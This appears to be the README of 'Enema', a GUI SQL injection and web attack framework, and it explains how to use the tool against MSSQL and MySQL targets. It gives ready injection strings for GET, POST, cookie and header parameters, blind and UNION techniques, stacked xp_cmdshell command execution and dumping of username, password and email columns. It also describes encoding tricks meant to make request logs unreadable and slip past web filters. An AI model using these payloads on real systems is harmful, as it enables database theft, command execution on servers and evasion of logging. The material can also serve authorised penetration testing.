## SQL Injection and Web Attack Framework ##
Enema is not auto-hacking software. This is dynamic tool for professional pentesters.

### Current version: 1.7 ###

  * Whats new:
    + Added custom plugins support.

  * Requirements:
    + [Python 3.10+]
    + [PyQt6]

  * Features:
    + Multi-platform.
    + User-friendly graphical interface.
    + Multithreaded.
    + Dump.
    + Customise your queries
    + Create your custom plugins to automate attacks

  * Supported for today:
    + POST, GET, Headers (User-Agent, Cookie, Referer, X-Forwarded-For, Custom Header ...)
    + MSSQL >=2000 and MySQL>=5.0 (You can add queries for other dbms yourself, like Oracle, Postgress)

  * Injection methods supported for today:
    + Error based injection.
    + Union based injection (using subquery).
    + Blind (time and boolean based)

---

[#SQL\_injection\_in\_GET\_requests](#SQL_injection_in_GET_requests.md)

[#SQL\_injection\_in\_POST\_requests,\_Headers](#SQL_injection_in_POST_requests,_Headers.md)

[#Blind\_injection](#Blind_injection.md)

[#Methods\_of\_db\_structure\_tab](#Methods_of_db_structure_tab.md)

[#Dump\_tab](#Dump_tab.md)

[#Useful\_functions](#Useful_functions.md)


---

### SQL injection in GET requests ###

---

For example vulnerable script:
```

http://site.com/vuln.aspx?id=1'
```
Response:
```

Unclosed quotation mark after the character string '1'`
```

If injection type is Error-based then ready for injection string using Enema will be:
```

http://site.com/vuln.aspx?id=1' and 1=[sub]--
```

For UNION-based sql injections you can use this url:
```

http://site.com/vuln.aspx?id=1' union all select null,null,[sub],null--
```

**`[sub]`** keyword indicates where inject SQL Substring.

If database rights - sysadmin, you can use this urls:
```

http://site.com/vuln.aspx?id=1' and 1=[sub];[cmd]--
```

**`[cmd]`** keywords indicates where inject xp\_cmdshell  and other stacked queries.

In this example `[sub]` used too. It needs for fetching xp\_cmdshell output.

Also you can use only `[cmd]` if you not interested in results or not output not available.


---

### Blind injection ###

---


**`[blind]`** keyword indicates where insert blind query.

When this keyword found in url, post data or cookies - enema enables options for blind attack in Query Tab.

For time-based injection you can define custom delay. Then run test and look for normal and delayed responses (lag checking).

If server lagging you can play with 'Max lag time' and 'Delay' options.


---

### SQL injection in POST requests, Headers ###

---


All the same, with a little correction.
For example vulnerable script:
```

http://site.com/login.aspx
Post data: _username=admin'&password=test123
```
```

Unclosed quotation mark after the character string 'admin'`
```

1. Put _http://site.com/login.aspx_ to URL.

2. Select method = _POST_.

Post data should be:
```

username=' and 1[eq][sub]--&password=test123
```

**`[eq]`** keyword means equal symbol - "=".

**This is important. Use `[eq]` instead of "=" in defined POST data or Cookies, and use**"%3b"**instead of ";" in defined Cookie header.**

For example Cookie string:
```

session=12345; uid=32321; cartid=' and 1[eq][sub]%3b[cmd]--; reffid=005541
```

If variable `[sub]` or `[cmd]` found in cookies, then Enema perceives attack as injection in cookies.


---

### Methods of db structure tab ###

---


**Tables** - fetch tables from current database.

**Columns** - fetch columns from tables in right field. (Drag and drop table or tables from left field to right.)

**Bases** - fetch basesfrom current database.

  * Supported fetching methods:
    1. not in(`[array]`)
    1. not in(`[substring]`) - multithreaded
    1. by ordinal\_position - multithreaded
    1. LIMIT - multithreaded

Field "Match pattern" for exclusive cases only.
Enema parsing sql data between "Match symbols", default match symbol is "~"

---

### Dump tab ###

---


**Table** - table for dump

**Columns** - columns for dump. Can be separated by ";".

**Primary key** - index number, something like CustomerID, or you can create your own table and insert data for dump.
e.g.
```

create table tmptbl (num int identity, sqldata varchar(8000) NULL, primary key (num)); insert into tmptbl select username + "|" + password + "|" + email from users
```

**From** and **To** - dump from position to position. (integer)

Dumper multithreaded. I successfuly tested it up to 50 threads. Your threads depend on your bandwidth speed :)

**Important**: `Dumper starts thread pool for each column. It means if you defined 10 threads and dumping table with 3 columns, dumper will start 30 threads.`


---

### Useful functions ###

---

`[urlenc]`, (for GET method). Full urlencode all between `[urlenc^ ... ^]`
This makes http request logs unreadable and bypassing some url filters / WAFs.

`[base64]`, (for GET method). Encoding to base64 all between `[base64^ ... ^]`
For situations, when input parameter encoded to base64.

Example:
```

http://www.site.com/index.asp?id=23[urlenc^ or 1=[sub]--^]
```
